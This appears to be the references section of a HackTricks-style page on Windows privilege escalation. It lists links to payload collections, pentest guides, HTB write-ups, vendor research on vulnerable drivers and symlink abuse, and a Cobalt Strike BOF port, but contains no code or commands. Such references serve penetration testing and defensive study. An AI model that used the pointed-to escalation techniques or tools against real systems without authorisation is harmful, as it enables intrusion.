- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
